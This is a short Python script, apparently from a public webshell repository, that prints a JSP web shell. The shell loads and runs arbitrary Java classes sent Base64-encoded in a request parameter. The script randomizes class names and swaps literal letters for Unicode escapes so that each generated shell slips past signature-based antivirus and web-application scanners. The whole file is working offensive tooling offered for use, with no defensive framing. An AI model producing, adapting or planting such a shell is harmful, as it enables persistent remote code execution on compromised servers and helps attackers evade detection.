import random

#author: pureqh
#github: https://github.com/pureqh/webshell

shell = '''<%!class {2} extends ClassLoader{0} {2}(ClassLoader {3}){0} super({3}); {1}public Class g(byte []b){0} return super.defineClass(b,0,b.length); {1}{1}%><% String cls=request.getParameter("zero");if(cls!=null){0} new {2}(this.\u0067etClass().\u0067etClassLoader()).g(new sun.misc.{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}().decodeBuffer(cls)).newInstance().equals(pageContext); {1}%>
'''



def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    arr1 = ['\u0042','B']
    arr2 = ['\u0041','A']
    arr3 = ['\u0053','S']
    arr4 = ['\u0045','E']
    arr5 = ['\u0036','6']
    arr6 = ['\u0034','4']
    arr7 = ['\u0044','D']
    arr8 = ['\u0065','e']
    arr9 = ['\u0063','c']
    arr10 = ['\u006f','o']
    arr11 = ['\u0064','d']
    arr12 = ['\u0065','e']
    arr13 = ['\u0072','r']

    lef = '''{'''
    rig = '''}'''
    var1 = random_name(4)
    var2 = random_name(4)
    var3 = random.choice(arr1)
    var4 = random.choice(arr2)
    var5 = random.choice(arr3)
    var6 = random.choice(arr4)
    var7 = random.choice(arr5)
    var8 = random.choice(arr6)
    var9 = random.choice(arr7)
    var10 = random.choice(arr8)
    var11 = random.choice(arr9)
    var12 = random.choice(arr10)
    var13 = random.choice(arr11)
    var14 = random.choice(arr12)
    var15 = random.choice(arr13)
    shellc = shell.format(lef,rig,var1,var2,var3,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15)
    return shellc


if __name__ == '__main__':
    print (build_webshell())